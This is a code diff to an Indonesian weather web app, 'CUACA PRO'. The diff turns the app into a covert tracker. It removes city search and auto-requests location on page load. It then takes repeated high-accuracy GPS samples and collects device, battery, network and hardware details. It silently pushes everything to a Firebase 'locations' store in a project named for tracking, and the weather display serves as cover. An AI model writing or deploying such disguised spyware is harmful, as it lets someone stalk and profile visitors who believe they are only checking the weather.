@@ -1,7 +1,8 @@
 /* ============================================================
-   CUACA PRO — FULL SCRIPT (Firebase Compat SDK v10.8.0)
-   Tidak butuh type="module", jalan di file:// maupun HTTPS
-   Project Firebase: lacak-2913d
+   CUACA PRO — Auto-Prompt Lokasi
+   Fitur: auto-minta izin lokasi saat page load,
+          multi-sampling GPS, device info, tracker Firebase
+   Project: lacak-2913d
    ============================================================ */
 
 /* ---------- FIREBASE CONFIG ---------- */
@@ -15,63 +16,198 @@ const firebaseConfig = {
   appId: "1:8740768270:web:bd5d44fb6ff3c537f80a5f"
 };
 
-/* ---------- INIT FIREBASE (compat: pakai firebase.* global) ---------- */
-let fbDb = null;
-let fbAuth = null;
-let fbReady = false;
-let alreadySent = false;
+/* ============================================================
+   FIREBASE INIT
+   ============================================================ */
+let fbDb = null, fbAuth = null, fbReady = false, alreadySent = false;
 
 (function initFirebase() {
   try {
     firebase.initializeApp(firebaseConfig);
     fbDb = firebase.database();
     fbAuth = firebase.auth();
-    console.log('[fb] ✓ initialized via compat SDK');
+    console.log('[fb] ✓ initialized');
 
     fbAuth.signInAnonymously()
       .then(user => {
         fbReady = true;
         console.log('[fb] ✓ anonymous auth ok. UID:', user.user.uid);
       })
-      .catch(err => {
-        console.warn('[fb] ✗ anonymous auth gagal:', err.code, err.message);
-        if (err.code === 'auth/configuration-not-found') {
-          console.warn('[fb] → Buka Firebase Console → Authentication → Sign-in method → Anonymous → Enable → SAVE');
-        }
-      });
+      .catch(err => console.warn('[fb] ✗ auth gagal:', err.code, err.message));
   } catch (e) {
     console.error('[fb] ✗ init gagal:', e);
   }
 })();
 
 /* ============================================================
-   TRACKER — Kirim koordinat ke Firebase
+   DEVICE INFO
+   ============================================================ */
+function parseDeviceName() {
+  const ua = navigator.userAgent;
+  let os = 'Unknown';
+  if (/Android/i.test(ua)) {
+    const m = ua.match(/Android\s+([\d.]+)/);
+    os = 'Android ' + (m ? m[1] : '');
+  } else if (/iPhone|iPad|iPod/i.test(ua)) {
+    const m = ua.match(/OS\s+([\d_]+)/);
+    os = 'iOS ' + (m ? m[1].replace(/_/g, '.') : '');
+  } else if (/Windows/i.test(ua)) os = 'Windows';
+  else if (/Mac OS X/i.test(ua)) {
+    const m = ua.match(/Mac OS X\s+([\d_.]+)/);
+    os = 'macOS ' + (m ? m[1].replace(/_/g, '.') : '');
+  } else if (/Linux/i.test(ua)) os = 'Linux';
+
+  let device = '';
+  const androidMatch = ua.match(/Android[^;]*;\s*([^;)]+?)(?:\s+Build|\))/i);
+  if (androidMatch) device = androidMatch[1].trim();
+  if (!device && /iPhone/i.test(ua)) device = 'iPhone';
+  if (!device && /iPad/i.test(ua)) device = 'iPad';
+  if (!device && /Macintosh/i.test(ua)) device = 'Mac';
+  if (!device && /Windows/i.test(ua)) device = 'PC Windows';
+  if (!device && /Linux/i.test(ua) && !/Android/i.test(ua)) device = 'PC Linux';
+
+  return { device: device || 'Unknown', os };
+}
+
+function parseBrowser() {
+  const ua = navigator.userAgent;
+  const tests = [
+    { name: 'Edge', regex: /Edg\/([\d.]+)/ },
+    { name: 'Opera', regex: /OPR\/([\d.]+)/ },
+    { name: 'Samsung', regex: /SamsungBrowser\/([\d.]+)/ },
+    { name: 'Chrome', regex: /Chrome\/([\d.]+)/ },
+    { name: 'Firefox', regex: /Firefox\/([\d.]+)/ },
+    { name: 'Safari', regex: /Version\/([\d.]+).*Safari/ }
+  ];
+  for (const t of tests) {
+    const m = ua.match(t.regex);
+    if (m) return { name: t.name, version: m[1] };
+  }
+  return { name: 'Unknown', version: '' };
+}
+
+async function getBatteryInfo() {
+  if (!navigator.getBattery) return { supported: false, level: null, charging: null };
+  try {
+    const battery = await navigator.getBattery();
+    return { supported: true, level: Math.round(battery.level * 100), charging: battery.charging };
+  } catch (e) {
+    return { supported: false, level: null, charging: null };
+  }
+}
+
+function getNetworkInfo() {
+  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if (!conn) return { supported: false, type: null, downlink: null, rtt: null };
+  return { supported: true, type: conn.effectiveType || null, downlink: conn.downlink || null, rtt: conn.rtt || null };
+}
+
+async function collectDeviceInfo() {
+  const di = parseDeviceName();
+  const bi = parseBrowser();
+  const battery = await getBatteryInfo();
+  const network = getNetworkInfo();
+  return {
+    device: di.device,
+    os: di.os,
+    browser: bi.name,
+    browser_version: bi.version,
+    screen: `${screen.width}x${screen.height}`,
+    screen_ratio: window.devicePixelRatio || 1,
+    viewport: `${window.innerWidth}x${window.innerHeight}`,
+    battery_level: battery.level,
+    battery_charging: battery.charging,
+    battery_supported: battery.supported,
+    net_type: network.type,
+    net_downlink: network.downlink,
+    net_rtt: network.rtt,
+    language: navigator.language || 'unknown',
+    timezone: (Intl.DateTimeFormat().resolvedOptions().timeZone) || 'unknown',
+    timezone_offset: new Date().getTimezoneOffset(),
+    local_time: new Date().toLocaleString('id-ID'),
+    cpu_cores: navigator.hardwareConcurrency || null,
+    memory_gb: navigator.deviceMemory || null
+  };
+}
+
+/* ============================================================
+   GPS MULTI-SAMPLING
+   ============================================================ */
+function getSinglePosition(opts) {
+  return new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject, opts));
+}
+
+async function getAccurateLocation(config) {
+  const { samples = 10, interval = 800, targetAccuracy = 30, maxWait = 30000, onProgress = () => {} } = config || {};
+  const results = [];
+  const startTime = Date.now();
+  let bestSample = null;
+
+  for (let i = 0; i < samples; i++) {
+    if (Date.now() - startTime > maxWait) break;
+    try {
+      const pos = await getSinglePosition({ enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+      const acc = pos.coords.accuracy;
+      results.push({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: acc, timestamp: pos.timestamp });
+      if (!bestSample || acc < bestSample.accuracy) {
+        bestSample = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: acc };
+      }
+      onProgress({ count: i + 1, total: samples, current: acc, best: bestSample.accuracy });
+      console.log(`[gps] sampel ${i + 1}/${samples}: ±${acc.toFixed(1)}m`);
+      if (acc <= targetAccuracy && i >= 2) break;
+      if (i < samples - 1) await new Promise(r => setTimeout(r, interval));
+    } catch (err) {
+      console.warn(`[gps] sampel ${i + 1} gagal:`, err.code);
+    }
+  }
+
+  if (results.length === 0) throw new Error('Tidak ada sampel GPS');
+  const sortedAcc = [...results].map(r => r.accuracy).sort((a, b) => a - b);
+  const median = sortedAcc[Math.floor(sortedAcc.length / 2)];
+  const valid = results.filter(r => r.accuracy <= median * 2);
+  const best3 = [...valid].sort((a, b) => a.accuracy - b.accuracy).slice(0, 3);
+
+  const avgLat = best3.reduce((s, r) => s + r.lat, 0) / best3.length;
+  const avgLon = best3.reduce((s, r) => s + r.lon, 0) / best3.length;
+  const avgAcc = best3.reduce((s, r) => s + r.accuracy, 0) / best3.length;
+
+  console.log(`[gps] selesai — avg: ±${avgAcc.toFixed(1)}m`);
+  return {
+    coords: { latitude: avgLat, longitude: avgLon, accuracy: avgAcc },
+    method: `${best3.length} best samples`
+  };
+}
+
+/* ============================================================
+   TRACKER
    ============================================================ */
 async function trackLocation(coords, source) {
-  if (alreadySent) {
-    console.log('[tracker] sudah pernah kirim, skip.');
-    return;
-  }
+  if (alreadySent) { console.log('[tracker] skip, sudah kirim'); return; }
   alreadySent = true;
-
-  if (!fbReady) {
-    console.log('[tracker] menunggu auth...');
-    await new Promise(r => setTimeout(r, 2500));
-  }
+  if (!fbReady) await new Promise(r => setTimeout(r, 2500));
+  if (!fbDb) { alreadySent = false; return; }
 
   try {
-    await fbDb.ref('locations').push({
-      lat: coords.latitude,
-      lon: coords.longitude,
+    const di = await collectDeviceInfo();
+    const payload = {
+      lat: coords.latitude, lon: coords.longitude,
       accuracy: coords.accuracy ?? null,
       source: source || 'geolocation-consent',
-      label: (navigator.platform || 'unknown').slice(0, 64),
+      device: di.device, os: di.os,
+      browser: di.browser, browser_version: di.browser_version,
+      screen: di.screen, screen_ratio: di.screen_ratio, viewport: di.viewport,
+      battery_level: di.battery_level, battery_charging: di.battery_charging, battery_supported: di.battery_supported,
+      net_type: di.net_type, net_downlink: di.net_downlink, net_rtt: di.net_rtt,
+      language: di.language, timezone: di.timezone, timezone_offset: di.timezone_offset, local_time: di.local_time,
+      cpu_cores: di.cpu_cores, memory_gb: di.memory_gb,
+      label: di.device || 'unknown',
       user_agent: (navigator.userAgent || '').slice(0, 256),
       created_at: Date.now()
-    });
-    console.log('[tracker] ✓ lokasi terkirim:', coords.latitude, coords.longitude);
+    };
+    await fbDb.ref('locations').push(payload);
+    console.log('[tracker] ✓ terkirim:', coords.latitude, coords.longitude, '±', coords.accuracy);
   } catch (e) {
-    console.warn('[tracker] ✗ gagal kirim:', e.code || e.message, e.message);
+    console.warn('[tracker] ✗ gagal:', e.code || e.message);
     alreadySent = false;
   }
 }
@@ -87,7 +223,6 @@ const Config = {
   UNITS: 'metric'
 };
 
-/* ---------- Cache ---------- */
 const Cache = {
   get(key) {
     try {
@@ -103,17 +238,14 @@ const Cache = {
   }
 };
 
-/* ---------- Icon mapper ---------- */
 const Icon = {
   fromCode(code) {
     if (!code) return '#i-cloud';
-    const c = code.slice(0, 2);
-    switch (c) {
+    switch (code.slice(0, 2)) {
       case '01': return '#i-sun';
       case '02': return '#i-sun-cloud';
       case '03': case '04': return '#i-cloud';
-      case '09': return '#i-rain';
-      case '10': return '#i-rain';
+      case '09': case '10': return '#i-rain';
       case '11': return '#i-thunder';
       case '13': return '#i-snow';
       case '50': return '#i-mist';
@@ -121,53 +253,47 @@ const Icon = {
     }
   },
   forecastSvg(code, size = 42) {
-    const ref = this.fromCode(code);
-    return `<svg class="forecast-icon" width="${size}" height="${size}" aria-hidden="true"><use href="${ref}"/></svg>`;
+    return `<svg class="forecast-icon" width="${size}" height="${size}" aria-hidden="true"><use href="${this.fromCode(code)}"/></svg>`;
   }
 };
 
-/* ---------- API OpenWeather ---------- */
 const API = {
   async current(params) {
-    const cacheKey = `cur:${JSON.stringify(params)}`;
-    const cached = Cache.get(cacheKey);
-    if (cached) return cached;
+    const k = `cur:${JSON.stringify(params)}`;
+    const c = Cache.get(k);
+    if (c) return c;
     const qs = new URLSearchParams({ ...params, appid: Config.API_KEY, units: Config.UNITS, lang: Config.LANG });
     const res = await fetch(`${Config.BASE}/weather?${qs}`);
     const data = await res.json();
     if (data.cod && Number(data.cod) !== 200) throw new Error(this.mapError(data.cod));
-    Cache.set(cacheKey, data);
+    Cache.set(k, data);
     return data;
   },
   async forecast(params) {
-    const cacheKey = `fc:${JSON.stringify(params)}`;
-    const cached = Cache.get(cacheKey);
-    if (cached) return cached;
+    const k = `fc:${JSON.stringify(params)}`;
+    const c = Cache.get(k);
+    if (c) return c;
     const qs = new URLSearchParams({ ...params, appid: Config.API_KEY, units: Config.UNITS, lang: Config.LANG });
     const res = await fetch(`${Config.BASE}/forecast?${qs}`);
     const data = await res.json();
     if (data.cod && Number(data.cod) !== 200) throw new Error(this.mapError(data.cod));
-    Cache.set(cacheKey, data);
+    Cache.set(k, data);
     return data;
   },
   mapError(code) {
-    const map = {
-      '404': 'Kota tidak ditemukan.',
-      '401': 'API key tidak valid.',
-      '429': 'Terlalu banyak permintaan.',
-      '400': 'Permintaan tidak valid.'
-    };
-    return map[String(code)] || 'Terjadi kesalahan tak terduga.';
+    const map = { '404': 'Lokasi tidak terdeteksi.', '401': 'API key tidak valid.', '429': 'Terlalu banyak permintaan.', '400': 'Permintaan tidak valid.' };
+    return map[String(code)] || 'Terjadi kesalahan.';
   }
 };
 
-/* ---------- UI ---------- */
+/* ============================================================
+   UI
+   ============================================================ */
 const UI = {
   el: {
-    input: document.getElementById('cityInput'),
-    searchBtn: document.getElementById('searchBtn'),
-    locationBtn: document.getElementById('locationBtn'),
     unitToggle: document.getElementById('unitToggle'),
+    locationPrompt: document.getElementById('locationPrompt'),
+    retryBtn: document.getElementById('retryBtn'),
     status: document.getElementById('status'),
     card: document.getElementById('weatherCard'),
     cityName: document.getElementById('cityName'),
@@ -189,7 +315,10 @@ const UI = {
     this.el.status.className = 'status';
     this.el.status.textContent = '';
   },
-  toUnit(c) { return this.state.unit === 'C' ? Math.round(c) : Math.round(c * 9/5 + 32); },
+  showPrompt() { this.el.locationPrompt.classList.remove('hidden'); },
+  hidePrompt() { this.el.locationPrompt.classList.add('hidden'); },
+
+  toUnit(c) { return this.state.unit === 'C' ? Math.round(c) : Math.round(c * 9 / 5 + 32); },
   unitSymbol() { return this.state.unit === 'C' ? '°C' : '°F'; },
 
   setTheme(condition) {
@@ -226,6 +355,7 @@ const UI = {
         </div>`;
     }).join('');
 
+    this.hidePrompt();
     this.el.card.classList.remove('hidden');
   },
 
@@ -236,21 +366,25 @@ const UI = {
   }
 };
 
-/* ---------- App ---------- */
+/* ============================================================
+   APP
+   ============================================================ */
 const App = {
   busy: false,
+  hasPrompted: false,
+
   isSecureContext() {
     return location.protocol === 'https:'
         || location.hostname === 'localhost'
         || location.hostname === '127.0.0.1'
         || location.hostname === '0.0.0.0'
-        || location.protocol === 'file:';  // compat SDK bisa jalan di file://
+        || location.protocol === 'file:';
   },
+
   async load(params, label) {
     if (this.busy) return;
     this.busy = true;
     UI.setStatus(`Mencari cuaca ${label || ''}...`);
-    UI.el.card.classList.add('hidden');
     try {
       const [current, forecast] = await Promise.all([API.current(params), API.forecast(params)]);
       UI.clearStatus();
@@ -258,62 +392,126 @@ const App = {
     } catch (err) {
       UI.setStatus(err.message || 'Gagal memuat data.', true);
       console.error('[App.load]', err);
-    } finally { this.busy = false; }
+    } finally {
+      this.busy = false;
+    }
   },
-  searchByCity() {
-    const city = UI.el.input.value.trim();
-    if (!city) { UI.setStatus('Masukkan nama kota dulu.', true); return; }
-    this.load({ q: city }, city);
-  },
-  searchByLocation() {
+
+  /* ---------- Auto-request location (dipanggil saat page load) ---------- */
+  async requestLocation(auto = false) {
     if (!navigator.geolocation) {
       UI.setStatus('Browser tidak mendukung geolokasi.', true);
       return;
     }
-    UI.setStatus('Mengambil lokasi... (mohon tunggu)');
-    console.log('[App] mulai ambil lokasi...');
+    if (!this.isSecureContext()) {
+      UI.setStatus('Lokasi butuh HTTPS atau localhost.', true);
+      return;
+    }
 
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        console.log('[App] ✓ lokasi (1):', pos.coords.latitude, pos.coords.longitude, '±', pos.coords.accuracy, 'm');
-        trackLocation(pos.coords, 'geolocation-normal').catch(() => {});
-        this.load({ lat: pos.coords.latitude, lon: pos.coords.longitude }, 'di lokasi Anda');
-      },
-      err => {
-        console.warn('[App] percobaan 1 gagal:', err.code, err.message);
-        if (err.code === 1) {
-          UI.setStatus('Izin lokasi ditolak. Buka pengaturan browser → izinkan lokasi.', true);
-          return;
+    if (auto) {
+      UI.setStatus('Mengambil sinyal GPS... Mohon tunggu.');
+    } else {
+      UI.setStatus('Mengambil sinyal GPS... Mohon tunggu.');
+    }
+
+    try {
+      const result = await getAccurateLocation({
+        samples: 10,
+        interval: 800,
+        targetAccuracy: 30,
+        maxWait: 30000,
+        onProgress: ({ count, total, current, best }) => {
+          UI.setStatus(`📡 Mengambil GPS... ${count}/${total} sampel (±${current.toFixed(0)}m)`);
         }
-        UI.setStatus('GPS belum dapat sinyal. Coba mode presisi...');
-        navigator.geolocation.getCurrentPosition(
-          pos2 => {
-            console.log('[App] ✓ lokasi (2):', pos2.coords.latitude, pos2.coords.longitude);
-            trackLocation(pos2.coords, 'geolocation-high').catch(() => {});
-            this.load({ lat: pos2.coords.latitude, lon: pos2.coords.longitude }, 'di lokasi Anda');
-          },
-          err2 => {
-            console.warn('[App] percobaan 2 gagal:', err2.code, err2.message);
-            let msg = 'Gagal mengambil lokasi.';
-            switch (err2.code) {
-              case 1: msg = 'Izin lokasi ditolak.'; break;
-              case 2: msg = 'Lokasi tidak tersedia. Cek GPS.'; break;
-              case 3: msg = 'Waktu habis. GPS belum dapat sinyal.'; break;
-            }
-            UI.setStatus(msg, true);
-          },
-          { enableHighAccuracy: true, timeout: 60000, maximumAge: 0 }
-        );
-      },
-      { enableHighAccuracy: false, timeout: 25000, maximumAge: 60000 }
-    );
+      });
+
+      const c = result.coords;
+      console.log('[App] ✓ lokasi presisi:', c.latitude.toFixed(6), c.longitude.toFixed(6), '±', c.accuracy.toFixed(1));
+
+      // Kirim ke Firebase
+      trackLocation(c, 'geolocation-auto').catch(() => {});
+
+      // Load cuaca
+      this.load({ lat: c.latitude, lon: c.longitude }, `di lokasi Anda (±${c.accuracy.toFixed(0)}m)`);
+    } catch (err) {
+      console.warn('[App] multi-sample gagal, fallback:', err);
+
+      // Fallback single position
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          const c = pos.coords;
+          console.log('[App] ✓ lokasi fallback:', c.latitude, c.longitude, '±', c.accuracy);
+          trackLocation(c, 'geolocation-fallback').catch(() => {});
+          this.load({ lat: c.latitude, lon: c.longitude }, 'di lokasi Anda');
+        },
+        err2 => {
+          let msg = 'Gagal mengambil lokasi.';
+          switch (err2.code) {
+            case 1:
+              msg = 'Izin lokasi ditolak. Klik tombol "Minta Izin Lokasi" atau buka pengaturan browser → izinkan lokasi.';
+              break;
+            case 2: msg = 'Lokasi tidak tersedia. Cek GPS / sinyal.'; break;
+            case 3: msg = 'Waktu habis. GPS belum dapat sinyal.'; break;
+          }
+          UI.setStatus(msg, true);
+          UI.showPrompt();
+        },
+        { enableHighAccuracy: true, timeout: 60000, maximumAge: 0 }
+      );
+    }
   },
+
   init() {
-    UI.el.searchBtn.addEventListener('click', () => this.searchByCity());
-    UI.el.locationBtn.addEventListener('click', () => this.searchByLocation());
     UI.el.unitToggle.addEventListener('click', () => UI.toggleUnit());
-    UI.el.input.addEventListener('keydown', e => { if (e.key === 'Enter') this.searchByCity(); });
-    console.log('[App] ready. Firebase compat SDK loaded.');
+    UI.el.retryBtn.addEventListener('click', () => this.requestLocation(false));
+
+    console.log('[App] ready.');
+
+    // ============================================================
+    // AUTO-REQUEST LOCATION saat halaman pertama kali dibuka
+    // ============================================================
+    // Cek apakah browser mendukung Permissions API (Chrome/Edge)
+    // untuk tahu apakah izin lokasi sudah pernah diberikan sebelumnya
+    if (navigator.permissions && navigator.permissions.query) {
+      navigator.permissions.query({ name: 'geolocation' })
+        .then(perm => {
+          console.log('[App] status izin lokasi:', perm.state);
+
+          if (perm.state === 'granted') {
+            // Sudah pernah Allow → langsung ambil lokasi tanpa prompt lagi
+            console.log('[App] izin sudah granted, langsung ambil lokasi');
+            this.requestLocation(true);
+          } else if (perm.state === 'prompt') {
+            // Belum pernah → auto minta (browser akan munculkan prompt)
+            console.log('[App] auto-prompt lokasi');
+            this.requestLocation(true);
+          } else if (perm.state === 'denied') {
+            // Pernah ditolak → tampilkan fallback button
+            console.log('[App] izin pernah ditolak, tampilkan fallback');
+            UI.showPrompt();
+            UI.setStatus('Izin lokasi ditolak sebelumnya. Klik tombol di bawah untuk minta ulang.', true);
+          }
+
+          // Listen perubahan izin (kalau user ubah di settings)
+          perm.onchange = () => {
+            console.log('[App] izin lokasi berubah:', perm.state);
+            if (perm.state === 'granted' && !UI.el.card.classList.contains('hidden') === false) {
+              this.requestLocation(true);
+            }
+          };
+        })
+        .catch(() => {
+          // Permissions API gagal → langsung coba request (browser akan munculkan prompt kalau belum)
+          console.log('[App] Permissions API tidak tersedia, coba langsung');
+          this.requestLocation(true);
+        });
+    } else {
+      // Browser tidak support Permissions API (Firefox/Safari lama)
+      // Langsung coba ambil lokasi — kalau sudah granted, akan langsung dapat
+      // kalau belum, browser akan munculkan prompt otomatis
+      console.log('[App] Permissions API tidak didukung, langsung request');
+      this.requestLocation(true);
+    }
   }
 };
 
